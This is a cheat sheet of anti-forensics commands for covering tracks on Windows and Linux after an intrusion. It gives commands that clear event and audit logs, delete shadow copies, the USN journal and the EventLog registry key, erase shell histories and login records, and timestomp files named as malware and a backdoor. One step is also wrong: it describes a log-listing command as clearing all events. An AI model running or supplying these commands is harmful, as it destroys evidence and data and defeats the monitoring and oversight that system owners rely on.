# Hiding-Tracks

# Clearing Event Logs

1. Open an elevated Command Prompt window. To do this, type "cmd" in the search bar, right-click on the Command Prompt icon and select "Run as administrator".

2. Enter the command wevtutil.exe el /q to clear all events in the event log.

3. To clear a specific log, type in the command wevtutil.exe cl [LogName] to clear only the log of your choice. Replace [LogName] with the name of the log you want to clear.

4. To confirm that the log has been cleared, use the command wevtutil.exe qe [LogName] to query the events in the log. This will return an empty list if the log has been cleared successfully.

# Hiding Windows Files

The attrib command can be used to hide files in Windows. To do this, open the Command Prompt (cmd.exe) and type "attrib +h [path\filename]". This will add the hidden attribute to the file, making it invisible in Windows Explorer. To make the file visible again, type "attrib -h [path\filename]" in the Command Prompt.


1. **Clearing Windows Event Logs**  
```powershell
wevtutil cl Application
wevtutil cl System
wevtutil cl Security
```

2. **Removing Sysmon Logs**  
```powershell
Remove-Item -Path "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx" -Force
```

3. **Clearing Windows Firewall Logs**  
```powershell
wevtutil cl "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"
```

4. **Wiping Security-Event Registry Channels**  
```powershell
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security" /f
```

5. **Disabling and Clearing Audit Policies**  
```cmd
auditpol /set /subcategory:* /success:disable /failure:disable
auditpol /clear /y
```

6. **Deleting Prefetch Files**  
```cmd
del C:\Windows\Prefetch\* /F /Q
```

7. **Deleting Volume Shadow Copies**  
```cmd
vssadmin delete shadows /all /quiet
```

8. **Wiping the NTFS USN Journal**  
```cmd
fsutil usn deletejournal /N C: /quiet
```

9. **Zero-filling Free Space (MFT Artifact Removal)**  
```cmd
sdelete -z C:
```

10. **Flushing Windows DNS Cache**  
```cmd
ipconfig /flushdns
```

11. **Clearing Windows ARP Cache**  
```cmd
arp -d *
```

12. **Clearing Bash History**  
```bash
history -c && history -w
rm ~/.bash_history
```

13. **Clearing Zsh History**  
```bash
: > ~/.zsh_history
unset HISTFILE
```

14. **Clearing PowerShell History**  
```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

15. **Truncating Linux Auth & Syslog**  
```bash
truncate -s 0 /var/log/auth.log /var/log/syslog
```

16. **Stopping auditd & Deleting Its Logs**  
```bash
systemctl stop auditd
rm -f /var/log/audit/audit.log
systemctl start auditd
```

17. **Vacuuming Systemd Journal Logs**  
```bash
journalctl --rotate
journalctl --vacuum-time=1s
```

18. **Timestomping File Timestamps**  
```bash
# Linux
touch -d "2023-01-01 00:00:00" /path/to/malicious.exe

# Windows PowerShell
(Get-Item C:\Tools\backdoor.exe).LastWriteTime = '2023-01-01 00:00:00'
```

19. **Clearing Shell Session Records**  
```bash
rm -rf ~/.zsh_sessions/*   # Zsh session logs
```

20. **Wiping Login Records (wtmp/btmp/lastlog)**  
```bash
> /var/log/wtmp
> /var/log/btmp
> /var/log/lastlog
```
